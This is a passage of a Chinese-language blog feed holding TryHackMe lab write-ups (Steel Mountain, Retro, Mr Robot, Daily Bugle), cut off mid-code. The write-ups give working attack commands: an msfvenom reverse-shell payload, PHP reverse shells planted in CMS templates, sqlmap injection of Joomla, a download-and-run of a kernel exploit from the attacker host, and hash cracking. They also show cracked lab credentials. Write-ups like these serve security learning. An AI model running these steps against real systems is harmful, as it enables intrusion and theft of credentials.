alt="image-20241015163344478"></p><p>在<code>/root</code>下找到<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMe系列之Mustacchio</summary>
    
    
    
    <category term="TryHackMe" scheme="https://ya1orin.github.io/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://ya1orin.github.io/tags/THM/"/>
    
    <category term="Linux" scheme="https://ya1orin.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>THM-Steel Mountain</title>
    <link href="https://ya1orin.github.io/posts/e8bded00.html"/>
    <id>https://ya1orin.github.io/posts/e8bded00.html</id>
    <published>2024-10-14T08:27:58.000Z</published>
    <updated>2024-11-13T05:19:26.829Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.51.252</p></blockquote><h1>写在前面</h1><p><strong>注意：机器不响应ping命令</strong></p><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><p><code>nmap --min-rate 10000 -Pn -sV -p- 10.10.51.252</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014163927698-310950412.png" alt="image-20241014163917459"></p><p>开放若干端口，但是可以看出这是一台windows主机</p><h2 id="80端口">80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014164050700-679057908.png" alt="image-20241014164041162"></p><p>一个普通的页面，扫下目录</p><p><code>gobuster dir -u http://10.10.51.252/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014170550004-1267980203.png" alt="image-20241014170540647"></p><p>没什么有用信息</p><p>查看下源码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014191706066-655513886.png" alt="image-20241014191656687"></p><p>找到人名<code>BillHarper</code></p><h2 id="SMB">SMB</h2><p><code>smbclient -L //10.10.51.252</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014191226841-505937933.png" alt="image-20241014191217373"></p><p>不允许匿名登录</p><h2 id="8080端口">8080端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014191537845-1876392148.png" alt="image-20241014191528445"></p><p>发现是一个文件服务器版本号是<code>2.3</code>，点进去看看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014192448714-1892990057.png" alt="image-20241014192438848"></p><p>到这里就知道这个服务器的名字了<code>Rejetto HTTP File Server</code></p><p>可以尝试去网上找找是否有历史漏洞</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014193542336-1095577421.png" alt="image-20241014193532643"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014193635486-838603181.png" alt="image-20241014193625312"></p><p>找到个<code>CVE-2014-6287</code></p><h1>获取初始访问权限</h1><p>启动msf</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014193829983-1899085758.png" alt="image-20241014193820488"></p><p>直接搜索这个cve并使用</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014194006026-989143443.png" alt="image-20241014193956689"></p><p>把必要的参数设置一下</p><p>直接run！</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014195051743-599602628.png" alt="image-20241014195042124"></p><p>获得基础用户权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014195133488-1609533962.png" alt="image-20241014195123919"></p><p>在<code>C:\Users\bill\Desktop</code>找到<code>user.txt</code></p><h1>提升至root权限</h1><p>这台机器上有了一个初始 shell，我们可以进一步枚举操作系统信息并查看将权限升级到root的利用点，使用<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">PowerUp</a>的<code>PowerShell</code>脚本来查看这台 Windows 机器并确定目标机是否存在任何异常和错误配置</p><p>将文件保存到本地，通过msf传上去</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014200155434-17085404.png" alt="image-20241014200146045"></p><p>可以通过<code>meterpreter</code>会话来加载<code>PowerShell</code>扩展，并进入 <code>PowerShell</code>的shell界面并执行脚本</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load powershell</span><br><span class="line">powershell_shell</span><br><span class="line"><span class="built_in">Import-Module</span> .\PowerUp.ps1</span><br><span class="line"><span class="built_in">Invoke-AllChecks</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014200617323-413379229.png" alt="image-20241014200607720"></p><p>发现有个特别的服务<code>CanRestart</code>选项被设置为<code>true</code>，当这个选项为<code>true</code>时，我们就能够在系统上重新启动此服务；而且这个应用程序的目录也是可写的，这意味着我们可以用一个恶意应用程序替换合法的应用程序，一旦服务重新启动，我们的恶意程序将运行</p><blockquote><p>ServiceName ：AdvancedSystemCareService9</p><p>ModifiablePath：C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe</p></blockquote><p><code>msfvenom</code>可用于生成反向shell的payload并将其输出为<code>windows</code>可执行文件，我们用<code>msfvenom</code>来生成一个和之前的应用程序同名的恶意应用程序:</p><p><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.14.90.122 LPORT=4444 -e x86/shikata_ga_nai -f exe -o ASCService.exe</code></p><p>在 <code>meterpreter</code> 中上传文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014201549634-483647248.png" alt="image-20241014201539989"></p><p>进入shell，先将这个服务停掉，替换我们的文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">sc</span> stop AdvancedSystemCareService9</span><br><span class="line"><span class="built_in">copy</span> ASCService.exe <span class="string">&quot;C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014201806112-808045312.png" alt="image-20241014201756699"></p><p>关于SC命令（Windows shell不区分大小写）：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SC</span>命令的格式：<span class="built_in">SC</span> [<span class="type">Servername</span>] command Servicename [<span class="type">Optionname</span>= <span class="type">Optionvalues</span>]</span><br><span class="line"></span><br><span class="line">Servername：指定服务所在的远程服务器的名称。名称必须采用通用命名约定 (UNC) 格式（“\\myserver”）。如果是在本地运行SC.exe，请忽略此参数。</span><br><span class="line">command ：如query,<span class="built_in">start</span>,stop,create,config等</span><br><span class="line"></span><br><span class="line">Servicename：服务名，也就是要配置的那个服务的名字，例如你要启动一个服务你就输入<span class="built_in">sc</span> <span class="built_in">start</span> +你要启动的服务名称（并非是服务显示名称）。</span><br><span class="line">Optionname= Optionvalues：是选项名和选项的值。</span><br></pre></td></tr></table></figure><p>在重启服务之前，在我们的机器上先启动个监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014201838886-990526090.png" alt="image-20241014201829234"></p><p>然后在靶机中重启服务</p><p><code>sc start AdvancedSystemCareService9</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014201912815-1720693336.png" alt="image-20241014201903513"></p><p>这时就提升到了root权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014202038317-726923127.png" alt="image-20241014202028946"></p><p>在<code>C:\Users\Administrator\Desktop</code>找到<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMe系列之Steel Mountain</summary>
    
    
    
    <category term="TryHackMe" scheme="https://ya1orin.github.io/categories/TryHackMe/"/>
    
    
    <category term="Windows" scheme="https://ya1orin.github.io/tags/Windows/"/>
    
    <category term="THM" scheme="https://ya1orin.github.io/tags/THM/"/>
    
  </entry>
  
  <entry>
    <title>THM-Retro</title>
    <link href="https://ya1orin.github.io/posts/70f6e376.html"/>
    <id>https://ya1orin.github.io/posts/70f6e376.html</id>
    <published>2024-10-12T03:46:11.000Z</published>
    <updated>2024-11-13T05:19:23.306Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.52.12</p></blockquote><h1>写在前面</h1><p><strong>注意：机器不响应ping命令</strong></p><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><p><code>nmap --min-rate 10000 -Pn -sV -p- 10.10.52.12</code></p><p>这里使用<code>-Pn</code>参数绕过ping命令的检查</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012124425580-746515289.png" alt="image-20241012124417135"></p><p>发现只开放了80和3389端口，这意味着当我们拿到一组凭据后，可以通过 rdp登录目标主机</p><h2 id="80端口">80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012125109670-1625718676.png" alt="image-20241012125102563"></p><p>是一个<code>windows server</code>默认的IIS服务</p><p>扫描一下目录</p><p><code>gobuster dir -u http://10.10.52.12/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012141145765-33043048.png" alt="image-20241012141138353"></p><p>访问一下<code>/retro</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012143041958-931600745.png" alt="image-20241012143034753"></p><p>在页面最下面发现文章<code>Ready Player One</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012143406701-1000163975.png" alt="image-20241012143359676"></p><p>根据文章意思猜测这是一组登录凭据<code>Wade : parzival</code></p><h1>RDP登录远程主机</h1><p>拿到一组用户凭据，结合之前的3389端口开放，尝试登录</p><p><code>xfreerdp /u:Wade /p:parzival /cert:ignore /v:10.10.52.12</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012143946216-981286449.png" alt="image-20241012143938820"></p><p>登陆成功</p><p>并在桌面找到user.txt</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012144100422-25041175.png" alt="image-20241012144053438"></p><h1>Windows提权</h1><p>先进行windows主机信息搜集</p><p>桌面上有个浏览器，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012144614643-1652594324.png" alt="image-20241012144607785"></p><p>发现该用户收藏了一个cve的页面，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012144928489-1007257350.png" alt="image-20241012144921303"></p><p>是<code>CVE-2019-1388</code></p><p>我们发现目标机的浏览器中有<code>CVE-2019-1388</code>的历史访问记录–猜测用户可能是想针对CVE-2019-1388漏洞打补丁，也就是说目标机器可能存在<code>CVE-2019-1388</code>漏洞</p><p>经过信息搜索可知<code>CVE-2019-1388</code>是一个UAC提权漏洞，该漏洞的基本信息如下：</p><blockquote><p><strong>UAC</strong>:用户帐户控制(User Account Control)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统的效果。</p></blockquote><blockquote><p><strong>CVE-2019-1388</strong>：该漏洞位于Windows的UAC（User Account Control，用户帐户控制）机制中。在默认情况下，Windows会在一个单独的桌面上显示所有的UAC提示 Secure Desktop；这些提示是由名为 consent.exe 的可执行文件产生的，该可执行文件以NT AUTHORITY\SYSTEM权限运行，完整性级别为System。</p><p>因为用户可以与该UI交互，因此对UI来说紧限制是必须的，否则，低权限的用户可能可以通过UI操作的循环路由以SYSTEM权限执行操作，即使隔离状态的看似无害的UI特征都可能会成为引发任意控制的动作链的第一步。</p><p><a href="https://github.com/jas502n/CVE-2019-1388">CVE-2019-1388漏洞利用</a></p></blockquote><h2 id="利用UAC漏洞提权">利用UAC漏洞提权</h2><p>我们需要通过执行<code>hhupd.exe</code>文件来完成对CVE-2019-1388的利用，在目标机用户Wade 桌面上的回收站中我们可以找到<code>hhupd.exe</code>文件——我们手动恢复该文件即可</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012145533318-1767894072.png" alt="image-20241012145525730"></p><p>右键单击hhupd.exe文件并选择以管理员身份运行它，然后先点击&quot;显示更多详细信息&quot;，再继续点击&quot;显示有关发布者证书的信息&quot;</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012145637747-550169434.png" alt="image-20241012145630586"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012145657684-1224412202.png" alt="image-20241012145647626"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012145719391-978453998.png" alt="image-20241012145712577"></p><p><img src="https://img2023.cnblogs.com/blog/2857591/202303/2857591-20230308122357026-1060167176.png" alt="image"></p><blockquote><p>如果在上图界面中无法手动选择使用浏览器以打开链接–则需要我们重新部署一个目标机器并在通过RDP运行目标机上的hhupd.exe文件之前 先打开一个IE浏览器实例</p></blockquote><p>因为目标机器没有连接到互联网，所以我们将在<code>Internet Explorer</code>浏览器中看到以下界面（这并不影响漏洞利用过程），此处其实是以系统级别的权限来打开浏览器，我们继续按<code>Alt</code>键弹出程序菜单栏，然后单击&quot;另存为…&quot;</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012150200066-2015236866.png" alt="image-20241012150152799"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012150347911-676620041.png" alt="image-20241012150339873"></p><p>在弹出的窗口中输入<code>C:\Windows\System32\*.*</code>点击回车，定位到<code>System32</code>目录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012150458156-990693367.png" alt="image-20241012150451317"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012150545579-666682287.png" alt="image-20241012150538624"></p><p>然后在上面输入<code>cmd.exe</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012150626890-48998100.png" alt="image-20241012150620038"></p><p>这里正常来说应该是可以提权成功的，但是我这里不知道是哪个步骤出错了，导致没有提权成功。。。</p><h2 id="利用内核漏洞提权">利用内核漏洞提权</h2><p>通过<code>systeminfo</code>进行信息搜集</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012151549840-1471797610.png" alt="image-20241012151542920"></p><p>发现在这个版本下有 <code>CVE-2017-0213</code>漏洞</p><p><a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213/CVE-2017-0213_x64.zip"> CVE-2017-0213漏洞利用</a></p><p>在kali机中下载以上 zip文件并通过<code>unzip</code>命令解压得到exe，然后传输该exe文件到靶机中，最后通过远程桌面直接执行该exe文件即可成功提权</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012152613938-1409594014.png" alt="image-20241012152606663"></p><p>起一个python服务</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012152654989-441442532.png" alt="image-20241012152648189"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在靶机cmd中使用Powershell的Invoke-WebRequest模块</span></span><br><span class="line">Powershell <span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> http://<span class="number">10.14</span>.<span class="number">90.122</span>:<span class="number">81</span>/CVE<span class="literal">-2017-0213_x64</span>.exe <span class="literal">-OutFile</span> exploit.exe</span><br><span class="line"></span><br><span class="line">.\exploit.exe</span><br><span class="line"><span class="comment">#执行漏洞利用exe之后，我们能看到该漏洞利用程序生成了一个新的CMD shell且权限为Administrator——提权成功。</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012154001467-1487303658.png" alt="image-20241012153954000"></p><p>提权成功，拿到<code>system</code>权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012154050259-1805537077.png" alt="image-20241012154043442"></p><p>在<code>c:/Users/Administrator/Desktop</code>找到<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMe系列之Retro</summary>
    
    
    
    <category term="TryHackMe" scheme="https://ya1orin.github.io/categories/TryHackMe/"/>
    
    
    <category term="Windows" scheme="https://ya1orin.github.io/tags/Windows/"/>
    
    <category term="THM" scheme="https://ya1orin.github.io/tags/THM/"/>
    
  </entry>
  
  <entry>
    <title>THM-Mr Robot CTF</title>
    <link href="https://ya1orin.github.io/posts/9f5f1768.html"/>
    <id>https://ya1orin.github.io/posts/9f5f1768.html</id>
    <published>2024-10-09T12:04:27.000Z</published>
    <updated>2024-11-13T05:19:17.378Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.202.26</p></blockquote><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><p><code>nmap --min-rate 10000 -sS -sV -sC 10.10.202.26</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009200958952-1307236102.png" alt="image-20241009200954547"></p><p>发现22，80等端口，但是ssh服务关闭了</p><h2 id="80端口">80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009201526558-368574539.png" alt="image-20241009201522229"></p><p>默认页面是一个类似于linux终端的界面，正常的命令执行不了，只能执行页面提供的命令</p><p>每个命令都测试了一下，并没有什么她特别重要的信息，先扫描一下目录</p><p><code>gobuster dir -u http://10.10.202.26/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009203017797-1719379315.png" alt="image-20241009203013287"></p><p>结果很多，但是可以看出来这是一个<code>wordpress</code>的站</p><h1>后台getshell</h1><p>先查看一下哎<code>robots.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009203649868-7394202.png" alt="image-20241009203645784"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009203728050-509535539.png" alt="image-20241009203724196"></p><p>找到第一个<code>key</code></p><p>另一个文件<code>fsocity.dic</code>访问后自动下载了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009204040584-1051975220.png" alt="image-20241009204036224"></p><p>打开后是个字典</p><p>接着访问扫描出来的结果时，发现在<code>/license</code>文件下有信息</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009204827064-1879933782.png" alt="image-20241009204822920"></p><p>很像<code>base64</code>编码，解码试试</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009205002306-1782867748.png" alt="image-20241009204958248"></p><p>得到一个用户名密码：<code>elliot:ER28-0652</code></p><p>尝试登陆<code>wordpress</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009205219208-88514281.png" alt="image-20241009205215191"></p><p>没想到这是个admn用户，赚翻啦</p><p>直接kali监听一手</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009210509904-1918358012.png" alt="image-20241009210505770"></p><p>将准备好的<a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php-reverse-shell.php</a>写在<code>404.php</code>上</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009212111435-983517017.png" alt="image-20241009212106883"></p><p>设置好ip和port后保存</p><p>浏览器访问<code>http://10.10.202.26/theme/twentyfifteen/404.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009212848299-908977679.png" alt="image-20241009212844443"></p><p>拿到初始权限</p><h1>提升至user权限</h1><p>切换交互式shell</p><p><code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009213103248-2017368856.png" alt="image-20241009213059186"></p><p><code>/home</code>下有<code>robot</code>用户，进入之后发现第二个<code>key</code>，但是我们查看不了，我们能查看另一个文件，根据其内容可以判断出这是<code>robot</code>的用户名和密码</p><p>将密码保存到文件<code>hash</code>中，用<code>hashcat</code>离线破解试试</p><p><code>hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009213509026-1986403223.png" alt="image-20241009213504820"></p><p>破解成功，拿到<code>robot</code>用户的明文密码<code>abcdefghijklmnopqrstuvwxyz</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009213616619-415158260.png" alt="image-20241009213612441"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009213650967-1591154118.png" alt="image-20241009213647123"></p><p>拿到第二个<code>key</code></p><h1>提升至root权限</h1><p>先尝试<code>sudo -l</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009214047420-696985946.png" alt="image-20241009214043116"></p><p>ok，不让用</p><p>用<code>find</code>查一下特权命令</p><p><code>find / -perm -u=s -type f 2&gt; /dev/null</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009214115004-1182315555.png" alt="image-20241009214110829"></p><p>发现有<code>nmap</code>，可以利用<code>nmap</code>提权</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009214602683-1592532035.png" alt="image-20241009214558352"></p><p>提权成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009214644568-905281974.png" alt="image-20241009214640433"></p><p>在<code>/root</code>目录下找到最后一个<code>key</code></p>]]></content>
    
    
    <summary type="html">TryHackMe系列之Mr Robot CTF</summary>
    
    
    
    <category term="TryHackMe" scheme="https://ya1orin.github.io/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://ya1orin.github.io/tags/THM/"/>
    
    <category term="Linux" scheme="https://ya1orin.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>THM-Daily Bugle</title>
    <link href="https://ya1orin.github.io/posts/4b5f600a.html"/>
    <id>https://ya1orin.github.io/posts/4b5f600a.html</id>
    <published>2024-10-08T05:23:31.000Z</published>
    <updated>2024-11-13T05:19:14.288Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.158.159</p></blockquote><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><p><code>nmap --min-rate 10000 -p- -sV -sC 10.10.158.159 -oN reports/nmap</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008133602854-1151410066.png" alt="image-20241008133559967"></p><p>发现有22，80，3306端口开放，并且在80端口上有<code>robots.txt</code>，开启了mysql服务</p><h2 id="80端口">80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008135115833-1217847155.png" alt="image-20241008135112969"></p><p>页面貌似没什么信息，扫描一下目录</p><p><code>gobuster dir -u http://10.10.158.159/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008135616416-1722312870.png" alt="image-20241008135614061"></p><p>先看下<code>robots.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008135637011-1331873752.png" alt="image-20241008135634589"></p><p>综上来看这是一个<code>joomla CMS</code>，目录访问后并没有发现什么信息</p><h1>SQL漏洞利用</h1><p>使用<code>joomscan</code>测试一下</p><p><code>joomscan -u http://10.10.158.159/</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008141255235-581479402.png" alt="image-20241008141252485"></p><p>发现版本是3.7.0，搜索一下是否有可以利用的漏洞</p><p><code>searchsploit joomla 3.7.0</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008141440663-205205108.png" alt="image-20241008141438525"></p><p>发现在该版本存在sql注入，将文件复制下来查看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008141545963-1681767930.png" alt="image-20241008141543468"></p><p>这里写了使用<code>sqlmap</code>工具进行sql注入，直接照着弄就行</p><p><code>sqlmap -u &quot;http://10.10.158.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008143755357-1634909799.png" alt="image-20241008143752393"></p><p>利用成功，得到数据库，继续爆破表</p><p><code>sqlmap -u &quot;http://10.10.158.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomla --tables -p list[fullordering]</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008144208470-98185412.png" alt="image-20241008144206265"></p><p>得到很多表，我们重点看<code>users</code>表，先查看字段的值</p><p><code>sqlmap -u &quot;http://10.10.158.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomla -T '#__users' --columns -p list[fullordering]</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008144831007-655266633.png" alt="image-20241008144828658"></p><p>选项直接正常选就行</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008150239571-1068282498.png" alt="image-20241008150237274"></p><p>漫长等待后也是把字段爆破出来了，我们重点看用户名和密码</p><p><code>sqlmap -u &quot;http://10.10.158.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomla -T '#__users' -C username,password --dump -p list[fullordering]</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008150415433-886794507.png" alt="image-20241008150413037"></p><p>成功拿到了一组凭据</p><p><code>jonah : $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm</code></p><p>密码是加密数据，这里使用<code>john</code>破解，先将密码保存至<code>hash</code></p><p><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008152021738-1397311919.png" alt="image-20241008152018882"></p><p>得到<code>jonah</code>用户的明文密码<code>spiderman123</code></p><p>登录<code>joomla</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008152334179-1197770814.png" alt="image-20241008152331521"></p><p>登陆成功</p><h1>获得初始权限</h1><p>查看后发现可以通过改写模板文件的内容getshell</p><p>首先点击右侧<code>Template</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008152509620-2024984243.png" alt="image-20241008152507304"></p><p>再点击右侧的<code>Template</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008152709570-776349238.png" alt="image-20241008152706921"></p><p>选第一个<code>Beez3</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008152751934-1122413670.png" alt="image-20241008152749484"></p><p>为了方便反弹shell，直接修改index.php文件</p><p>将<a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php-reverse-shell.php</a>写到文件中，并修改其中的ip和port</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008154536026-2069500358.png" alt="image-20241008154533386"></p><p>保存，在kali中起个监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008153222944-538312390.png" alt="image-20241008153220414"></p><p>在页面中访问刚才修改的文件</p><p><code>http://10.10.158.159/templates/beez3/index.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008154616790-1766426576.png" alt="image-20241008154614259"></p><p>getshell成功！</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008154837476-1061401653.png" alt="image-20241008154835273"></p><p>现在只有一个初始访问权限，还需要横向移动到<code>jjameson</code>用户</p><h1>提升至user权限</h1><p>先查看文件</p><p><img src="C:/Users/lemon/AppData/Roaming/Typora/typora-user-images/image-20241008160838389.png" alt="image-20241008160838389"></p><p>在查看文件的时候发现在 <code>/var/www/html</code>目录下有个<code>configuration.php</code>文件，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161000178-1468348786.png" alt="image-20241008160957808"></p><p>发现有密码<code>nv5uz9r3ZEDzVjNu</code>，貌似是root用户的，ssh登录一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161333840-1625929510.png" alt="image-20241008161331426"></p><p>看样子不是root的密码，尝试ssh登陆<code>jjameson</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161255917-2029099622.png" alt="image-20241008161253699"></p><p>登陆成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161356936-1355687411.png" alt="image-20241008161354772"></p><p>直接在当前页面找到<code>user.txt</code></p><h1>提升至root权限</h1><p>先执行<code>sudo -l</code>看看是否有可利用的</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161550666-1278824895.png" alt="image-20241008161548452"></p><p>可以使用<code>yum</code>提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 